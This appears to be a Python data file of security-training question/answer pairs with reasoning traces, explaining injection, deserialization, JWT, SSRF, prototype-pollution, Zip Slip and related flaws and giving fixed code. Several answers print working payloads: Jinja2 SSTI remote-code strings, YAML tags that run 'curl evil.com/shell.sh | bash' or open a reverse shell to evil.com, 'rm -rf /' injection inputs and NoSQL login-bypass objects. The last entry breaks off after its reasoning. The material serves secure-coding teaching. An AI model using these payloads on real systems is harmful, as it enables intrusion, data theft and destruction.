"""Phase 1B: Foundation Thinking — Security Analysis (Part 1/4)
Injection attacks: SQL, NoSQL, command injection, template injection."""

PAIRS = [
    (
        "thinking/security-sqli-second-order",
        "Our app lets users set a display name. The name is stored safely via parameterized query, but later used in a report-generation query that crashes. The code:\n\n```python\n# Registration — safe\ndef register_user(username, display_name):\n    db.execute(\n        'INSERT INTO users (username, display_name) VALUES (?, ?)',\n        (username, display_name)\n    )\n\n# Report generation — vulnerable\ndef generate_user_report(username):\n    user = db.execute(\n        'SELECT display_name FROM users WHERE username = ?', (username,)\n    ).fetchone()\n    \n    display_name = user['display_name']\n    \n    # Build report query using the stored display name\n    report = db.execute(\n        f\"SELECT * FROM activity_log WHERE user_display = '{display_name}'\"\n    ).fetchall()\n    return report\n```\n\nA user registered with display name `admin' OR '1'='1' --`. What happens?",
        r'''<think>
This is **second-order SQL injection** — one of the sneakiest variants.

**How it works:**
1. The injection payload is stored safely via parameterized query:
   `INSERT INTO users (username, display_name) VALUES (?, 'admin'' OR ''1''=''1'' --')`
   The parameterized query correctly escapes the quotes — the string is stored as-is in the database.

2. Later, the report function retrieves the display name as a normal string: `admin' OR '1'='1' --`

3. The report query uses f-string interpolation:
   ```sql
   SELECT * FROM activity_log WHERE user_display = 'admin' OR '1'='1' --'
   ```
   The stored payload breaks out of the string context and adds `OR '1'='1'`, returning ALL activity logs.

**Why this is dangerous:**
- The input was validated/parameterized at entry time — security review passes
- The vulnerability is in a different function, possibly written by a different developer
- The data has been "laundered" through the database — it appears trustworthy
- Standard input sanitization doesn't catch it because the dangerous value comes from the DB, not user input

**Defense:**
The fundamental rule: **never trust any data in SQL, regardless of source.** Use parameterized queries for EVERY query, even when the data comes from your own database.
</think>

This is **second-order SQL injection**. The payload is stored safely but later used unsafely in a different query.

## Attack Flow

1. **Registration** (safe): Parameterized query stores `admin' OR '1'='1' --` as-is in the database
2. **Report generation** (vulnerable): Retrieves the stored string and injects it via f-string:
   ```sql
   SELECT * FROM activity_log WHERE user_display = 'admin' OR '1'='1' --'
   ```
3. **Result**: Returns ALL activity logs for ALL users

## Why This Is Missed

- Input was parameterized at entry — passes security review
- The vulnerability is in a completely different function
- Data appears "trusted" because it comes from the database

## Fix: Parameterize EVERY Query, Regardless of Data Source

```python
def generate_user_report(username):
    user = db.execute(
        'SELECT display_name FROM users WHERE username = ?', (username,)
    ).fetchone()

    display_name = user['display_name']

    # ALWAYS parameterize — even for data from your own DB
    report = db.execute(
        'SELECT * FROM activity_log WHERE user_display = ?',
        (display_name,)
    ).fetchall()
    return report
```

**Rule: Data from the database is NOT trusted data.** Parameterize every query, every time, regardless of where the value comes from.'''
    ),
    (
        "thinking/security-nosql-injection-mongodb",
        "Our MongoDB login endpoint is vulnerable. An attacker can log in as any user without knowing the password:\n\n```python\nfrom flask import request, jsonify\nfrom pymongo import MongoClient\n\ndb = MongoClient().myapp\n\n@app.route('/api/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    user = db.users.find_one({\n        'username': data['username'],\n        'password': data['password']\n    })\n    if user:\n        return jsonify(token=create_token(user))\n    return jsonify(error='Invalid credentials'), 401\n```\n\nThe attacker sends: `{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}`\n\nExplain why this works and how to fix it.",
        r'''<think>
When the attacker sends `{"password": {"$ne": ""}}`, the MongoDB query becomes:

```python
db.users.find_one({
    'username': 'admin',
    'password': {'$ne': ''}
})
```

MongoDB interprets `{'$ne': ''}` as a query operator: "password is not equal to empty string." Since the admin's password is some hash (not empty), this condition is TRUE. The attacker logs in without knowing the password.

This works because:
1. `request.get_json()` deserializes JSON objects into Python dicts
2. MongoDB query operators like `$ne`, `$gt`, `$regex`, `$where` are just dict keys
3. The code passes user input directly into the query without type checking

Other attacks:
- `{"password": {"$regex": ".*"}}` — matches anything
- `{"password": {"$gt": ""}}` — greater than empty string (matches all non-empty)
- `{"username": {"$regex": "^a"}, "password": {"$ne": ""}}` — log in as any user starting with 'a'
</think>

MongoDB interprets `{"$ne": ""}` as a query operator: "password not equal to empty string." Since the admin's password hash isn't empty, the condition is true — the attacker logs in without the password.

## Attack Variants

```json
{"password": {"$ne": ""}}           // Not equal to empty → matches all passwords
{"password": {"$regex": ".*"}}      // Regex matches everything
{"password": {"$gt": ""}}           // Greater than empty → matches all
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}  // Try multiple users
```

## Fix: Type Validation at the Boundary

```python
from flask import request, jsonify

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()

    # Strict type checking — reject non-string values
    username = data.get('username')
    password = data.get('password')

    if not isinstance(username, str) or not isinstance(password, str):
        return jsonify(error='Invalid input type'), 400

    if not username or not password:
        return jsonify(error='Missing credentials'), 400

    # Now safe — username and password are guaranteed strings, not dicts
    user = db.users.find_one({'username': username})
    if user and verify_password(password, user['password_hash']):
        return jsonify(token=create_token(user))
    return jsonify(error='Invalid credentials'), 401
```

**Key changes:**
1. **Type validation** — reject non-string values (blocks operator injection)
2. **Separate query from auth** — find user first, then verify password in Python
3. **Password hashing** — never store or compare plaintext passwords'''
    ),
    (
        "thinking/security-command-injection-subprocess",
        "A file conversion API lets users convert uploaded images. The code shells out to ImageMagick:\n\n```python\nimport subprocess\nfrom flask import request\n\n@app.route('/api/convert', methods=['POST'])\ndef convert_image():\n    input_path = request.form['input_path']\n    output_format = request.form['output_format']\n    \n    cmd = f'convert {input_path} output.{output_format}'\n    result = subprocess.run(cmd, shell=True, capture_output=True)\n    \n    if result.returncode == 0:\n        return send_file(f'output.{output_format}')\n    return jsonify(error='Conversion failed'), 500\n```\n\nIdentify the vulnerabilities and fix them.",
        r'''<think>
Multiple severe vulnerabilities:

1. **Command injection via `shell=True` + f-string:**
   - `input_path = "image.png; rm -rf /"` → executes `convert image.png; rm -rf / output.png`
   - `output_format = "png; cat /etc/passwd"` → executes `convert input output.png; cat /etc/passwd`
   - The shell interprets `;`, `|`, `&&`, `$()`, backticks as command separators/substitution

2. **Path traversal:**
   - `input_path = "../../../etc/passwd"` → reads arbitrary files
   - `output_format = "../../../etc/cron.d/backdoor"` → writes to arbitrary locations

3. **ImageMagick-specific attacks:**
   - SVG files with embedded XXE (XML External Entities)
   - ImageMagick's own delegate mechanism can execute commands via specially crafted files
   - Need ImageMagick's policy.xml to restrict dangerous operations

Fix: use list form of subprocess (no shell), validate inputs, use allowlists.
</think>

Three severe vulnerabilities:

## 1. Command Injection (`shell=True` + f-string)
```
input_path = "img.png; rm -rf /"
→ convert img.png; rm -rf / output.png
```

## 2. Path Traversal
```
input_path = "../../../etc/passwd"
output_format = "../../../tmp/backdoor"
```

## 3. ImageMagick Delegate Exploitation
Crafted SVG/MVG files can trigger command execution through ImageMagick's built-in delegate system.

## Fix

```python
import subprocess
import os
import uuid
from flask import request, jsonify, send_file

ALLOWED_FORMATS = {'png', 'jpg', 'jpeg', 'gif', 'webp', 'bmp'}
UPLOAD_DIR = '/var/app/uploads'
OUTPUT_DIR = '/var/app/output'

@app.route('/api/convert', methods=['POST'])
def convert_image():
    uploaded = request.files.get('image')
    output_format = request.form.get('output_format', '').lower().strip()

    if not uploaded:
        return jsonify(error='No image uploaded'), 400

    # Allowlist output format
    if output_format not in ALLOWED_FORMATS:
        return jsonify(error=f'Unsupported format. Allowed: {ALLOWED_FORMATS}'), 400

    # Generate safe filenames — never use user input in paths
    safe_id = uuid.uuid4().hex
    input_path = os.path.join(UPLOAD_DIR, f'{safe_id}_input')
    output_path = os.path.join(OUTPUT_DIR, f'{safe_id}.{output_format}')

    uploaded.save(input_path)

    try:
        # List form — NO shell interpretation, NO injection possible
        result = subprocess.run(
            ['convert', input_path, output_path],
            capture_output=True,
            timeout=30,  # Prevent hang on malicious files
        )

        if result.returncode == 0 and os.path.exists(output_path):
            return send_file(output_path)
        return jsonify(error='Conversion failed'), 500
    finally:
        # Clean up temp files
        for path in (input_path, output_path):
            try:
                os.unlink(path)
            except OSError:
                pass
```

**Key defenses:**
1. **No `shell=True`** — list form prevents command interpretation
2. **Server-generated filenames** — no user input in file paths
3. **Format allowlist** — only accept known-safe output formats
4. **Timeout** — prevents resource exhaustion from malicious files
5. **Accept file upload** — don't let users specify arbitrary file paths'''
    ),
    (
        "thinking/security-ssti-jinja2",
        "A greeting page lets users customize their welcome message. A security researcher submitted `{{7*7}}` as their name and got `49` back:\n\n```python\nfrom flask import Flask, request, render_template_string\n\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name', 'World')\n    template = f'<h1>Hello, {name}!</h1>'\n    return render_template_string(template)\n```\n\nExplain the vulnerability and demonstrate the escalation path from `{{7*7}}` to RCE.",
        r'''<think>
This is Server-Side Template Injection (SSTI) in Jinja2.

The code builds a template string with user input, then renders it. Jinja2 evaluates `{{ }}` expressions. So `name = "{{7*7}}"` creates template `<h1>Hello, {{7*7}}!</h1>` which Jinja renders as `<h1>Hello, 49!</h1>`.

**Escalation path to RCE:**

1. **Information disclosure:** `{{config}}` — dumps Flask config (secret key, DB credentials)
2. **Object traversal:** `{{''.__class__.__mro__[1].__subclasses__()}}` — lists all Python classes loaded in memory
3. **Find subprocess.Popen or os._wrap_close:**
   ```
   {{''.__class__.__mro__[1].__subclasses__()[INDEX]}}
   ```
   where INDEX is the position of `subprocess.Popen` in the subclasses list
4. **RCE:**
   ```
   {{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
   ```

Common payloads:
- `{{config.items()}}` — dump all config
- `{{request.environ}}` — dump environment variables
- `{{cycler.__init__.__globals__.os.popen('id').read()}}` — direct RCE via Jinja2 globals
</think>

This is **Server-Side Template Injection (SSTI)**. User input is embedded in a Jinja2 template string, so `{{ }}` expressions are evaluated server-side.

## Escalation: From Math to RCE

```
Step 1 — Confirm SSTI:
  ?name={{7*7}} → 49

Step 2 — Information disclosure:
  ?name={{config}} → dumps Flask secret key, DB credentials

Step 3 — Access Python internals:
  ?name={{''.__class__.__mro__[1].__subclasses__()}}
  → lists ALL loaded Python classes

Step 4 — Remote Code Execution:
  ?name={{cycler.__init__.__globals__.os.popen('id').read()}}
  → uid=1000(www-data)
```

Full RCE from a "name" field. The attacker can read files, execute commands, install backdoors.

## Fix: Never Put User Input in Templates

```python
from flask import Flask, request, render_template_string
from markupsafe import escape

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # Pass as variable — Jinja auto-escapes it, never evaluates it as code
    return render_template_string('<h1>Hello, {{ name }}!</h1>', name=name)
```

**Or even better — use a template file:**
```python
# templates/greet.html: <h1>Hello, {{ name }}!</h1>
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    return render_template('greet.html', name=name)
```

**The rule:** Template strings are code. User input is data. Never mix them. Pass user data as template **variables**, not as part of the template **source**.'''
    ),
    (
        "thinking/security-xpath-injection",
        "An XML-based config system lets admins query user records. An attacker can access other users' data:\n\n```python\nimport lxml.etree as ET\n\ndef get_user_data(xml_db, username, password):\n    tree = ET.parse(xml_db)\n    # XPath query to authenticate and fetch user data\n    query = f\"//users/user[username='{username}' and password='{password}']\"\n    results = tree.xpath(query)\n    if results:\n        return ET.tostring(results[0]).decode()\n    return None\n```\n\nAttacker sends: `username = admin' or '1'='1' or 'a'='a`",
        r'''<think>
XPath injection — same concept as SQL injection but for XML queries.

The query becomes:
```xpath
//users/user[username='admin' or '1'='1' or 'a'='a' and password='anything']
```

Due to operator precedence (`and` binds tighter than `or`), this evaluates as:
```
username='admin' OR '1'='1' OR ('a'='a' AND password='anything')
```

The middle condition `'1'='1'` is always true, so the entire predicate is true for ALL user nodes. The attacker gets the first user's data (likely admin).

Even simpler: `username = ' or '1'='1` with empty password.
</think>

**XPath injection** — same class as SQL injection, targeting XML queries.

## The Attack

```
Input: username = admin' or '1'='1' or 'a'='a
Query: //users/user[username='admin' or '1'='1' or 'a'='a' and password='...']
```

`'1'='1'` is always true → returns ALL users. Attacker gets admin data without the password.

## Fix: Parameterized XPath with Variable Binding

```python
import lxml.etree as ET

def get_user_data(xml_db, username, password):
    tree = ET.parse(xml_db)

    # lxml supports XPath variables — safe from injection
    query = "//users/user[username=$username and password=$password]"
    results = tree.xpath(
        query,
        username=username,
        password=password,
    )
    if results:
        return ET.tostring(results[0]).decode()
    return None
```

**lxml's XPath variable binding** passes values separately from the query structure — the values can never break out of their string context. Same principle as parameterized SQL queries.

**Also:** never store plaintext passwords in XML. Hash them and compare hashes in application code.'''
    ),
    (
        "thinking/security-deserialization-yaml-load",
        "A configuration import feature lets users upload YAML files. A security scan flagged this code:\n\n```python\nimport yaml\n\ndef import_config(yaml_string):\n    config = yaml.load(yaml_string)  # Warning: yaml.load is unsafe\n    validate_config_schema(config)\n    apply_config(config)\n    return config\n```\n\nAn attacker uploads:\n```yaml\n!!python/object/apply:os.system ['curl http://evil.com/shell.sh | bash']\n```\n\nExplain the vulnerability and the fix.",
        r'''<think>
`yaml.load()` without a Loader argument uses the FullLoader (in newer PyYAML) or the default Loader which can instantiate arbitrary Python objects. The `!!python/object/apply` tag tells PyYAML to call a Python function with the given arguments.

So `!!python/object/apply:os.system ['curl ...']` calls `os.system('curl ... | bash')` — full RCE.

Other dangerous YAML tags:
- `!!python/object/new:` — creates new objects
- `!!python/module:` — imports modules
- `!!python/name:` — references Python names
</think>

`yaml.load()` can instantiate arbitrary Python objects. The `!!python/object/apply:os.system` tag calls `os.system()` during parsing — **RCE before `validate_config_schema` even runs**.

## Attack Variants

```yaml
# Execute system command
!!python/object/apply:os.system ['rm -rf /']

# Reverse shell
!!python/object/apply:subprocess.check_output [['bash', '-c', 'bash -i >& /dev/tcp/evil.com/4444 0>&1']]

# Read files
!!python/object/apply:builtins.open ['etc/passwd']
```

## Fix: Always Use `safe_load`

```python
import yaml

def import_config(yaml_string):
    # safe_load only allows basic types: str, int, float, bool, list, dict, None
    config = yaml.safe_load(yaml_string)
    validate_config_schema(config)
    apply_config(config)
    return config
```

**`yaml.safe_load`** restricts deserialization to basic Python types — no object instantiation, no code execution. The `!!python/*` tags are rejected.

**Rule:** Never use `yaml.load()` on untrusted input. Always use `yaml.safe_load()`. PyYAML even emits a deprecation warning if you call `yaml.load()` without specifying `Loader=yaml.SafeLoader`.'''
    ),
    (
        "thinking/security-jwt-algorithm-confusion",
        "Our JWT verification accepts both HS256 (symmetric) and RS256 (asymmetric) tokens. An attacker forged a valid admin token:\n\n```python\nimport jwt\n\n# Server's RSA public key (used to verify RS256 tokens)\nRSA_PUBLIC_KEY = open('public_key.pem').read()\n\ndef verify_token(token):\n    try:\n        payload = jwt.decode(\n            token,\n            RSA_PUBLIC_KEY,\n            algorithms=['HS256', 'RS256']  # Accept both!\n        )\n        return payload\n    except jwt.InvalidTokenError:\n        return None\n```\n\nThe attacker created a token with `algorithm: HS256` signed using the RSA public key as the HMAC secret. Why does this work?",
        r'''<think>
This is the JWT algorithm confusion attack (CVE-2015-9235).

**How RS256 normally works:**
- Server has a private key (secret) and public key (shared)
- Token is signed with the private key
- Token is verified with the public key
- Attacker doesn't have the private key → can't forge tokens

**The attack:**
1. The RSA public key is... public. Anyone can get it.
2. The attacker creates a JWT with `alg: HS256` (symmetric)
3. They sign it using the RSA public key AS the HMAC secret
4. The server receives the token, sees `alg: HS256`
5. Since HS256 is in the allowed algorithms list, the server uses HS256 verification
6. For HS256, the "key" parameter is the shared secret — which is `RSA_PUBLIC_KEY`
7. The server verifies: `HMAC(payload, RSA_PUBLIC_KEY)` — matches!
8. Token is accepted as valid

The attacker used the publicly available RSA public key as an HMAC secret key. The server's code uses the same key value for both HS256 and RS256, but with completely different semantics.
</think>

**Algorithm confusion attack.** The RSA public key is public. The attacker:

1. Gets the RSA public key (it's public)
2. Creates a JWT with `alg: HS256`
3. Signs it with `HMAC-SHA256(payload, RSA_PUBLIC_KEY)` — using the public key as the HMAC secret
4. Server sees `alg: HS256`, verifies with `jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['HS256'])` — match!

The server uses `RSA_PUBLIC_KEY` as both the RSA verification key AND the HMAC secret key. Since the public key is known, the attacker can sign anything.

## Fix: Never Allow Multiple Algorithm Types with One Key

```python
import jwt

RSA_PUBLIC_KEY = open('public_key.pem').read()

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            RSA_PUBLIC_KEY,
            algorithms=['RS256'],  # ONLY accept RS256
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

**If you truly need both algorithms** (e.g., migration), use separate keys:

```python
def verify_token(token):
    # Peek at the header to determine algorithm, but ONLY accept expected ones
    header = jwt.get_unverified_header(token)

    if header.get('alg') == 'RS256':
        return jwt.decode(token, RSA_PUBLIC_KEY, algorithms=['RS256'])
    elif header.get('alg') == 'HS256':
        return jwt.decode(token, HMAC_SECRET, algorithms=['HS256'])
    else:
        raise jwt.InvalidAlgorithmError('Unsupported algorithm')
```

**Rule:** The `algorithms` parameter is a security control, not a convenience feature. Only allow the exact algorithm(s) your key type supports.'''
    ),
    (
        "thinking/security-ssrf-url-validation-bypass",
        "Our image proxy fetches URLs on behalf of users. We block internal IPs but an attacker accessed our cloud metadata service:\n\n```python\nimport requests\nimport ipaddress\nfrom urllib.parse import urlparse\n\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('10.0.0.0/8'),\n    ipaddress.ip_network('172.16.0.0/12'),\n    ipaddress.ip_network('192.168.0.0/16'),\n    ipaddress.ip_network('127.0.0.0/8'),\n    ipaddress.ip_network('169.254.169.254/32'),  # Cloud metadata\n]\n\ndef is_safe_url(url):\n    parsed = urlparse(url)\n    hostname = parsed.hostname\n    \n    try:\n        ip = ipaddress.ip_address(hostname)\n        for network in BLOCKED_NETWORKS:\n            if ip in network:\n                return False\n    except ValueError:\n        pass  # Not an IP, it's a hostname — allow it\n    \n    return True\n\n@app.route('/api/proxy')\ndef proxy_image():\n    url = request.args['url']\n    if not is_safe_url(url):\n        return jsonify(error='Blocked'), 403\n    \n    resp = requests.get(url, timeout=5)\n    return resp.content, resp.status_code\n```\n\nThe attacker used `http://metadata.internal/latest/api/token` and `http://0x7f000001/` (127.0.0.1 in hex). How?",
        r'''<think>
Multiple SSRF bypass techniques:

1. **DNS rebinding / hostname resolution bypass:**
   The code checks the hostname string, not the resolved IP. `metadata.internal` or any custom DNS name resolving to 169.254.169.254 bypasses the check because `ipaddress.ip_address('metadata.internal')` raises ValueError → falls through to the `pass` branch → allowed.

2. **IP encoding tricks:**
   - `0x7f000001` = 127.0.0.1 in hex → `ipaddress.ip_address('0x7f000001')` might not parse correctly
   - `2130706433` = 127.0.0.1 in decimal
   - `0177.0.0.1` = 127.0.0.1 in octal
   - `[::ffff:127.0.0.1]` = IPv4-mapped IPv6
   - `127.0.0.1.nip.io` = wildcard DNS that resolves to 127.0.0.1

3. **TOCTOU:** Even if the code resolved DNS and checked the IP, DNS could return a different IP on the second resolution (during `requests.get`). This is DNS rebinding.

4. **Redirects:** The URL passes validation, but `requests.get` follows redirects to an internal URL. The redirect target is never validated.

The fundamental problem: checking the URL/hostname before the request, but the actual network connection resolves DNS independently.

Fix: resolve DNS yourself, validate the resolved IP, then connect to that specific IP.
</think>

Multiple bypass techniques defeat URL-based validation:

## Bypasses Used

1. **DNS names resolving to internal IPs:** `metadata.internal` → `169.254.169.254`. The code only checks literal IP addresses; hostnames skip validation entirely (`except ValueError: pass`).

2. **Alternative IP encodings:** `0x7f000001` (hex), `2130706433` (decimal), `017700000001` (octal) — all represent `127.0.0.1` but may not parse with `ipaddress.ip_address()`.

3. **Redirects:** `requests.get()` follows HTTP redirects. A URL like `http://evil.com/redir` returns `302 Location: http://169.254.169.254/` — the redirect target is never validated.

4. **DNS rebinding:** First DNS query returns a safe IP (passes check), second query (during `requests.get`) returns `169.254.169.254`.

## Fix: Validate Resolved IP, Not URL

```python
import socket
import ipaddress
import requests
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
]

def is_ip_safe(ip_str: str) -> bool:
    try:
        ip = ipaddress.ip_address(ip_str)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return False
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
        return True
    except ValueError:
        return False

@app.route('/api/proxy')
def proxy_image():
    url = request.args['url']
    parsed = urlparse(url)

    if parsed.scheme not in ('http', 'https'):
        return jsonify(error='Invalid scheme'), 403

    # Resolve DNS ourselves and validate the IP
    try:
        hostname = parsed.hostname
        resolved_ip = socket.getaddrinfo(hostname, parsed.port or 443)[0][4][0]
    except socket.gaierror:
        return jsonify(error='DNS resolution failed'), 400

    if not is_ip_safe(resolved_ip):
        return jsonify(error='Blocked internal address'), 403

    # Connect to the resolved IP directly (bypasses DNS rebinding)
    # Disable redirects to prevent redirect-based bypass
    resp = requests.get(
        url,
        timeout=5,
        allow_redirects=False,
        headers={'Host': hostname},
    )

    if resp.is_redirect:
        return jsonify(error='Redirects not allowed'), 403

    return resp.content, resp.status_code
```

**Key defenses:** resolve DNS explicitly, validate the resolved IP (not the hostname), disable redirects, use `is_private`/`is_loopback` checks.'''
    ),
    (
        "thinking/security-prototype-pollution-js",
        "A Node.js API merges user-provided settings with defaults. An attacker sent a payload that made `isAdmin` return true for ALL users:\n\n```javascript\nfunction merge(target, source) {\n    for (const key of Object.keys(source)) {\n        if (typeof source[key] === 'object' && source[key] !== null) {\n            if (!target[key]) target[key] = {};\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n    return target;\n}\n\napp.post('/api/settings', (req, res) => {\n    const userSettings = req.body;  // User-controlled JSON\n    const settings = merge({}, userSettings);\n    saveSettings(req.user.id, settings);\n    res.json({ success: true });\n});\n\n// Elsewhere in the app:\nfunction isAdmin(user) {\n    return user.role === 'admin';\n}\n```\n\nAttacker payload: `{\"__proto__\": {\"role\": \"admin\"}}`",
        r'''<think>
Prototype pollution. In JavaScript, `__proto__` is a reference to an object's prototype. When the merge function encounters `__proto__` as a key:

1. `source['__proto__']` = `{role: 'admin'}`
2. `target['__proto__']` = the target's prototype (which is `Object.prototype` for plain objects)
3. `merge(target['__proto__'], {role: 'admin'})` → merges into `Object.prototype`
4. Now `Object.prototype.role = 'admin'`
5. ANY object that doesn't have its own `role` property will inherit `role: 'admin'` from the prototype chain

So `user.role` returns `'admin'` for any user object that doesn't explicitly set `role`. `isAdmin()` returns true for everyone.
</think>

**Prototype pollution.** The merge function processes `__proto__` as a regular key:

1. `merge(target, {__proto__: {role: 'admin'}})`
2. `target['__proto__']` is `Object.prototype` (the shared prototype)
3. Merge sets `Object.prototype.role = 'admin'`
4. Now **every object** inherits `role: 'admin'` unless it has its own `role` property
5. `user.role === 'admin'` → `true` for all users without explicit role

## Fix: Block Dangerous Keys

```javascript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (DANGEROUS_KEYS.has(key)) continue;  // Skip prototype-polluting keys

        if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
            if (!target[key] || typeof target[key] !== 'object') {
                target[key] = {};
            }
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Or better: use Object.create(null) for prototype-less objects
function safeMerge2(target, source) {
    const result = Object.create(null);  // No prototype chain
    Object.assign(result, target);
    for (const [key, value] of Object.entries(source)) {
        result[key] = value;
    }
    return result;
}
```

**Best defense:** Use `Map` instead of plain objects for user data, or freeze `Object.prototype` in your test suite to detect pollution attempts.'''
    ),
    (
        "thinking/security-path-traversal-zip-slip",
        "A file upload feature accepts ZIP archives and extracts them. An attacker used it to overwrite the application's source code:\n\n```python\nimport zipfile\nimport os\n\ndef extract_upload(zip_path, extract_dir):\n    with zipfile.ZipFile(zip_path) as zf:\n        zf.extractall(extract_dir)\n    return os.listdir(extract_dir)\n```\n\nThe ZIP contained a file with path `../../../app/main.py`. Explain the attack and fix.",
        r'''<think>
Zip Slip vulnerability. ZIP archives store relative paths for each entry. A malicious ZIP can contain entries with `../` in their path. When `extractall()` extracts them, it writes outside the intended directory.

In this case: `../../../app/main.py` relative to `extract_dir` traverses up and overwrites the application source code.

Python 3.12+ actually has some protection against this, but older versions don't.
</think>

**Zip Slip.** ZIP entries can contain paths with `../`, causing extraction to write outside the target directory. The entry `../../../app/main.py` traverses up from `extract_dir` and overwrites the app's source code.

## Fix: Validate Each Entry Path

```python
import zipfile
import os

def safe_extract(zip_path: str, extract_dir: str) -> list[str]:
    extract_dir = os.path.realpath(extract_dir)
    extracted = []

    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            # Resolve the full target path
            target = os.path.realpath(os.path.join(extract_dir, member))

            # Verify it's inside extract_dir
            if not target.startswith(extract_dir + os.sep) and target != extract_dir:
                raise SecurityError(
                    f"Zip Slip detected: {member!r} would extract to {target}"
                )

            # Also block absolute paths and suspicious entries
            if os.path.isabs(member) or '..' in member.split('/'):
                raise SecurityError(f"Dangerous path in archive: {member!r}")

        # All entries validated — safe to extract
        zf.extractall(extract_dir)
        extracted = zf.namelist()

    return extracted
```

**Note:** Python 3.12+ added `zipfile.Path` and improved `extractall()` security, but explicit validation is still recommended for defense-in-depth. The same vulnerability exists in `tarfile` — use `tar.extractall(filter='data')` on Python 3.12+.'''
    ),
    (
        "thinking/security-race-condition-privilege-check",
        "A file serving endpoint checks permissions before serving. An attacker with a regular account accessed admin-only files:\n\n```python\n@app.route('/api/files/<path:filepath>')\ndef serve_file(filepath):\n    full_path = os.path.join(FILES_DIR, filepath)\n    \n    # Check permission\n    file_meta = db.execute(\n        'SELECT owner, permission FROM files WHERE path = ?',\n        (filepath,)\n    ).fetchone()\n    \n    if not file_meta:\n        abort(404)\n    \n    if file_meta['permission'] == 'admin' and not current_user.is_admin:\n        abort(403)\n    \n    # Serve the file\n    return send_file(full_path)\n```\n\nThe attacker used this sequence:\n1. Request `/api/files/report.pdf` (their own file, permission='user')\n2. Simultaneously, admin changes `report.pdf` permission to 'admin'\n3. Request arrives after permission check but admin change hasn't committed",
        r'''<think>
This is a TOCTOU race condition in authorization. But actually, the scenario described is a typical check-then-act race. Let me think about what the actual exploit is.

Actually, re-reading the scenario: the attacker requests their own file (which is 'user' permission at check time), but between the permission check and `send_file`, the file's permission changes to 'admin'. But this isn't the attacker's exploit — the admin changing permissions is independent.

A more realistic attack: the attacker uses a symlink or path race. Or: the attacker exploits the time between checking permissions for `filepath` in the database and actually serving `full_path` from the filesystem.

Wait — there's a path mismatch! The code checks `filepath` against the database but serves `full_path = os.path.join(FILES_DIR, filepath)`. If the attacker can change what `full_path` points to (symlink), they can serve a different file than what was checked.

Actually, the simplest exploit: the attacker requests `/api/files/my_file.pdf` (which they own), but simultaneously replaces `my_file.pdf` with a symlink to `admin_report.pdf`. The permission check passes (my_file.pdf is 'user'), but `send_file` follows the symlink to the admin file.

Let me present both the TOCTOU and the path manipulation angles.
</think>

This is a **TOCTOU (Time-of-Check-Time-of-Use)** vulnerability with two attack vectors:

## Attack 1: Symlink Race
1. Attacker owns `my_file.pdf` (permission='user')
2. Permission check passes for `my_file.pdf`
3. Between check and `send_file`, attacker replaces `my_file.pdf` with a symlink to `admin_report.pdf`
4. `send_file` follows the symlink — serves admin file

## Attack 2: Permission Change Race
1. Request checks permissions — file is 'user' at check time
2. Concurrent transaction changes permission to 'admin'
3. File is served despite now being restricted

## Fix: Atomic Check + Serve

```python
import os

@app.route('/api/files/<path:filepath>')
def serve_file(filepath):
    # Sanitize path
    safe_path = os.path.normpath(filepath)
    if safe_path.startswith('..') or os.path.isabs(safe_path):
        abort(400)

    full_path = os.path.realpath(os.path.join(FILES_DIR, safe_path))

    # Verify resolved path is inside FILES_DIR
    if not full_path.startswith(os.path.realpath(FILES_DIR) + os.sep):
        abort(403)

    # Check permission using the RESOLVED path (not the requested path)
    resolved_relative = os.path.relpath(full_path, FILES_DIR)
    file_meta = db.execute(
        'SELECT owner, permission FROM files WHERE path = ?',
        (resolved_relative,)
    ).fetchone()

    if not file_meta:
        abort(404)

    if file_meta['permission'] == 'admin' and not current_user.is_admin:
        abort(403)

    # Open file directly, don't follow symlinks at serve time
    try:
        fd = os.open(full_path, os.O_RDONLY | getattr(os, 'O_NOFOLLOW', 0))
        # Verify file identity hasn't changed (inode check)
        stat = os.fstat(fd)
        expected_stat = os.stat(full_path, follow_symlinks=False)
        if stat.st_ino != expected_stat.st_ino:
            os.close(fd)
            abort(403)
        os.close(fd)
    except OSError:
        abort(403)

    return send_file(full_path)
```

**Key defenses:** resolve symlinks before checking permissions, verify the resolved path is inside the allowed directory, use `O_NOFOLLOW` where possible.'''
    ),
    (
        "thinking/security-mass-assignment",
        "A Django REST API lets users update their profile. An attacker changed their own `is_staff` flag to `True`:\n\n```python\nclass UserSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = User\n        fields = '__all__'  # Includes is_staff, is_superuser!\n\nclass UserProfileView(generics.UpdateAPIView):\n    serializer_class = UserSerializer\n    \n    def get_object(self):\n        return self.request.user\n```\n\nThe attacker sent: `PATCH /api/profile/ {\"name\": \"Hacker\", \"is_staff\": true, \"is_superuser\": true}`",
        r'''<think>
Mass assignment / over-posting vulnerability. `fields = '__all__'` exposes every model field to the serializer, including sensitive fields like `is_staff` and `is_superuser`. The PATCH endpoint accepts any field in the request body and updates the model.

Fix: explicitly list allowed fields, or use `read_only_fields`.
</think>

